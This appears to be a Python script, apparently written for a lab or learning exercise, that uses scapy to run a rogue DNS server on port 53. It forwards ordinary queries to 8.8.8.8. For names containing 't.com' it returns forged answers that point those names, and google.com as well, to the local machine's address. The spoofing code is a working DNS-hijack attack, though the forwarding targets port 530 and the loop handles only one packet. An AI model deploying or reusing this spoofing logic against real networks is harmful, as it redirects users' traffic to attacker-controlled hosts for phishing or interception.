import socket
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sr1, send, ICMP, send, sendp, Ether,sr, sniff,get_if_addr,conf, srp, ARP, RandShort

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(('0.0.0.0',53))
print("Hay servidor")

socket_google = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

DNS_SERVER_IP = "127.0.0.1"  # Your local IP

def forward_dns(og, orig_pkt: IP, addr):
    print(f"Forwarding: {orig_pkt[DNSQR].qname}")
    # response = sr1(
    #     IP(dst='8.8.8.8')/
    #         UDP(sport=orig_pkt[UDP].sport)/
    #         DNS(rd=1, id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname)),
    #     verbose=0,
    # )

    fwd_pkt = IP(dst='8.8.8.8')/UDP(sport=orig_pkt[UDP].sport, dport = 53)/DNS(og)
    print(fwd_pkt.show())
    socket_google.sendto(bytes(fwd_pkt),('8.8.8.8',530))
    response, r_addr = s.recvfrom(512)

    response = IP()/UDP()/DNS(response)
    # print(response.show())

    resp_pkt = IP(dst=orig_pkt[IP].src, src=DNS_SERVER_IP)/UDP(dport=orig_pkt[UDP].sport)/DNS()
    resp_pkt[DNS] = response[DNS]

    
    s.sendto(bytes(resp_pkt), addr)
    return f"Responding to {orig_pkt[IP].src}"

def get_response(og, pkt: IP, addr):
    if (
        DNS in pkt and
        pkt[DNS].opcode == 0 and
        pkt[DNS].ancount == 0
    ):
        if "t.com" in str(pkt["DNS Question Record"].qname):
            print("hay spoof")
            spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=DNS_SERVER_IP)/DNSRR(rrname="google.com",rdata=DNS_SERVER_IP))
            # send(spf_resp, verbose=0)
            s.sendto(bytes(spf_resp), addr)
            return f"Spoofed DNS Response Sent: {pkt[IP].src}"
        else:
            # make DNS query, capturing the answer and send the answer
            return forward_dns(og, pkt, addr)


while True:
    message, addr = s.recvfrom(512)
    msg = IP()/UDP()/DNS(message)
    # print(msg.show())
    # print(msg.show())
    print(get_response(message, msg, addr))
    break
    
    